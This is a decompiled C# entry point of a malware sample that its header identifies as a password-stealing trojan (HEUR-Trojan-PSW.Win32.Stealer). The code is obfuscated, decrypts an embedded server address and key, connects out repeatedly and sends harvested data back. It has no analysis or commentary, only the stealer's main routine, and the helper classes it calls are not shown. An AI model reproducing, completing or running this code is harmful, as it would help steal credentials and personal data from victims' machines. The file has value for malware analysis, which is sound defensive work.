// Decompiled with JetBrains decompiler
// Type: Program
// Assembly: Ajowans, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B9451E92-9872-44E9-A53B-32BF899B0E6F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.Win32.Stealer.gen-ca27c07cc9fddcd8bc07b2b9aa3406ab019fb54797bf2163b190217e9c17ce6a.exe

using Ajowans;
using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Windows;

public static class Program
{
  private static void RegisterFile(string[] pathList)
  {
    ImageTable.RegisterFile();
    BuilderInfo.RegisterFile();
    AssistantSettings.RegisterFile();
  }

  public static void WriteLine()
  {
    try
    {
      if (TreeNodeService.RegisterFile())
      {
label_1:
        switch (2)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Program.WriteLine);
            }
            ProcessManager.RegisterFile(TemplateService.RegisterFile(2460));
            break;
        }
      }
      if (!StreamStream.RegisterFile(Arguments.Message))
      {
label_6:
        switch (3)
        {
          case 0:
            goto label_6;
          default:
            TaskFactory taskFactory = ComponentStream.RegisterFile();
            // ISSUE: reference to a compiler-generated field
            Func<MessageBoxResult> function = Program.\u003C\u003Ec.pathList;
            if (function == null)
            {
label_8:
              switch (4)
              {
                case 0:
                  goto label_8;
                default:
                  // ISSUE: reference to a compiler-generated field
                  function = Program.\u003C\u003Ec.pathList = (Func<MessageBoxResult>) (() => BuilderScope.RegisterFile(EmulatorStack.RegisterFile(Arguments.Message, Arguments.Key), "", (MessageBoxButton) TemplateService.RegisterFile(2512), (MessageBoxImage) TemplateService.RegisterFile(2516)));
                  break;
              }
            }
            taskFactory.StartNew<MessageBoxResult>(function);
            break;
        }
      }
      ConnectionProvider connectionProvider = PluginLoader.RegisterFile();
      bool flag = TemplateService.RegisterFile(2464) != 0;
      while (!flag)
      {
        string pathList = EmulatorStack.RegisterFile(Arguments.IP, Arguments.Key);
        char[] generatorCache1 = new char[TemplateService.RegisterFile(2468)];
        generatorCache1[TemplateService.RegisterFile(2472)] = (char) TemplateService.RegisterFile(2476);
        string[] strArray = FormStack.RegisterFile((object) pathList, generatorCache1);
        for (int index = TemplateService.RegisterFile(2480); index < strArray.Length; index += TemplateService.RegisterFile(2488))
        {
          string generatorCache2 = strArray[index];
          if (ActivatorDesigner.RegisterFile((object) connectionProvider, generatorCache2))
          {
label_14:
            switch (5)
            {
              case 0:
                goto label_14;
              default:
                flag = TemplateService.RegisterFile(2484) != 0;
                goto label_19;
            }
          }
        }
label_18:
        switch (3)
        {
          case 0:
            goto label_18;
        }
label_19:
        DiskSite.RegisterFile(TemplateService.RegisterFile(2492));
      }
label_21:
      switch (4)
      {
        case 0:
          goto label_21;
        default:
          Entity2 generatorCache = OptionsDictionary.RegisterFile();
          while (!OptionsStream.RegisterFile((object) connectionProvider, out generatorCache))
          {
            if (!DiskTree.PrintDirectory((object) connectionProvider))
            {
label_24:
              switch (3)
              {
                case 0:
                  goto label_24;
                default:
                  throw BitmapService.RegisterFile();
              }
            }
            else
              DiskSite.RegisterFile(TemplateService.RegisterFile(2496));
          }
label_28:
          switch (4)
          {
            case 0:
              goto label_28;
            default:
              Entity7 pathList1 = new Entity7();
              BookmarkInvoker.RegisterFile(ref pathList1, EmulatorStack.RegisterFile(Arguments.ID, Arguments.Key));
              Entity7 namesEnabled = pathList1;
              EntityResolver pathList2 = ItemBase.Extract<EntityResolver>();
              while (!NodeEventArgs.RegisterFile((object) pathList2, connectionProvider, generatorCache, ref namesEnabled))
                DiskSite.RegisterFile(TemplateService.RegisterFile(2500));
label_32:
              switch (6)
              {
                case 0:
                  goto label_32;
                default:
                  Entity7 pathList3 = namesEnabled;
                  SolutionQueue.RegisterFile(ref pathList3, BitmapManager.RegisterFile());
                  AddinContext.RegisterFile(ref pathList3, (byte[]) null);
                  IList<Entity6> previousHandler1 = (IList<Entity6>) PageInfo.RegisterFile();
                  XmlFileTable.RegisterFile(ref pathList3, StreamProvider.RegisterFile(4408));
                  while (!DomainSet.RegisterFile((object) connectionProvider, pathList3, out previousHandler1))
                  {
                    if (!DiskTree.PrintDirectory((object) connectionProvider))
                    {
label_35:
                      switch (1)
                      {
                        case 0:
                          goto label_35;
                        default:
                          throw BitmapService.RegisterFile();
                      }
                    }
                    else
                      DiskSite.RegisterFile(TemplateService.RegisterFile(2504));
                  }
label_39:
                  switch (7)
                  {
                    case 0:
                      goto label_39;
                    default:
                      using (List<int>.Enumerator pathList4 = TreeNodeConverter.RegisterFile((object) CommandTable.RegisterFile((object) EditorDesigner.RegisterFile(namesEnabled), (IEnumerable<Entity6>) previousHandler1)))
                      {
                        while (DiskQueue.RegisterFile(ref pathList4))
                        {
                          int previousHandler2 = ConnectionStream.RegisterFile(ref pathList4);
                          while (!PartitionSerializer.RegisterFile((object) connectionProvider, pathList3, previousHandler2))
                          {
                            if (!DiskTree.PrintDirectory((object) connectionProvider))
                            {
label_44:
                              switch (2)
                              {
                                case 0:
                                  goto label_44;
                                default:
                                  throw BitmapService.RegisterFile();
                              }
                            }
                            else
                              DiskSite.RegisterFile(TemplateService.RegisterFile(2508));
                          }
label_48:
                          switch (2)
                          {
                            case 0:
                              goto label_48;
                            default:
                              continue;
                          }
                        }
label_50:
                        switch (3)
                        {
                          case 0:
                            goto label_50;
                          default:
                            return;
                        }
                      }
                  }
              }
          }
      }
    }
    catch (Exception ex)
    {
      AssistantSettings.RegisterFile();
    }
  }
}
